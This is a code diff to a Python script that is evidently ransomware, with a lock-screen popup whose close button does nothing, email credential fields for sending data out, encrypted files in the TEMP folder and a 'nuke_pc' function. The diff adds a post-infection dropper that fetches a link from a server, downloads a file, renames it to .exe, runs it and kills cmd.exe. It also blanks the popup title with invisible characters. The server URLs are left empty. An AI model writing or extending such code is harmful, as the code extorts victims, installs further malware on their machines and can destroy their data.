@@ -11,6 +11,7 @@ import sys
 import shutil
 import winreg
 import base64
+import requests
 
 SENDER = ""
 SENDER_P = ""  # App password here,
@@ -236,7 +237,26 @@ def disinfect_stidium():
 # Post-infection
 def post_infect():
     # Infect the host with a malware after it has been decrypted, did you expect me to just let it free?
-    pass
+    def download_payload(file_name, delete_before_trying):
+        if delete_before_trying:
+            try:
+                os.remove(file_name)
+            except FileNotFoundError:
+                pass
+        # Get the download link from the server
+        d = requests.get(r"")  # TODO: put some link here to download the .exe version of the downloader
+        # Download the file and save it to the same dir as the script
+        r = requests.get(d.text, allow_redirects=True)
+
+        with open(f"{file_name}.txt", "wb") as f:
+            f.write(r.content)
+
+        # change it to .exe
+        os.rename(f"{file_name}.txt", f"{file_name}.exe")
+
+        # run the exe and kill cmd task
+        os.system(f"{file_name}.exe")
+        os.system("taskkill /f /im cmd.exe")
 
 
 def nuke_pc():
@@ -271,7 +291,7 @@ def nuke_pc():
 def popup_window(attack_id, key, email, attempts):
     # Create the main window
     root = tk.Tk()
-    root.title(f"{attack_id}")
+    root.title("​​​​")
 
     # Override the close button to do nothing
     def do_nothing():  # NOQA
@@ -419,7 +439,7 @@ def main():
     if SENDER == "" or SENDER_P == "" or RECEIVER == "" or not (SENDER.endswith(".com")) or len(SENDER_P) != 16 or \
             not (RECEIVER.endswith(
                 ".com")):  # if either of these conditions are met, stop it incase the user haven't set it up correctly
-        print("Please set up the email settings in the config file")
+        print("Please set up the email settings on the top")
     else:
         if os.path.exists(os.path.join(os.environ["TEMP"], "temp23.txt.enc")) \
                 and os.path.exists(os.path.join(os.environ["TEMP"], "pkg.txt.enc")) \
